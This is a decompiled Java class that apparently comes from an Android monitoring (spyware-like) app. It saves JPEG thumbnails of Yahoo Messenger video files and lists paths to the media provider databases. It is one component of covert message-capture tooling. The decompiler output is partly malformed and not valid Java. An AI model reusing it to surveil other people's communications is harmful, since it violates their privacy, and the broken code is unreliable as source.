package com.vvt.capture.yahoo.a;

import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.media.ThumbnailUtils;
import com.vvt.ak.a;
import com.vvt.im.a.c;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import java.io.File;
import java.io.FileOutputStream;

public class f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private static final File[] d;
  
  static
  {
    File[] arrayOfFile = new File[2];
    File localFile = new java/io/File;
    localFile.<init>("/data/data/com.android.providers.media/databases/");
    arrayOfFile[0] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/dbdata/databases/com.android.providers.media/");
    arrayOfFile[1] = localFile;
    d = arrayOfFile;
  }
  
  public static String a(String paramString1, String paramString2)
  {
    Object localObject1 = null;
    Object localObject2 = ImType.YAHOO;
    Object localObject3 = ImMediaFileType.THUMBMAIL;
    localObject2 = c.a(paramString1, (ImType)localObject2, (ImMediaFileType)localObject3);
    localObject3 = c.a(ImMediaFileType.THUMBMAIL);
    Object localObject4 = new java/lang/StringBuilder;
    ((StringBuilder)localObject4).<init>();
    localObject2 = ((StringBuilder)localObject4).append((String)localObject2);
    localObject4 = File.separator;
    localObject2 = (String)localObject4 + (String)localObject3;
    int i = 3;
    localObject3 = ThumbnailUtils.createVideoThumbnail(paramString2, i);
    localObject4 = new java/io/File;
    ((File)localObject4).<init>((String)localObject2);
    if (localObject3 != null) {}
    try
    {
      FileOutputStream localFileOutputStream = new java/io/FileOutputStream;
      localFileOutputStream.<init>((File)localObject4);
      localObject4 = Bitmap.CompressFormat.JPEG;
      int j = 40;
      boolean bool1 = ((Bitmap)localObject3).compress((Bitmap.CompressFormat)localObject4, j, localFileOutputStream);
      if (bool1) {
        localObject1 = localObject2;
      }
      localFileOutputStream.flush();
      localFileOutputStream.close();
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    return (String)localObject1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/yahoo/a/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */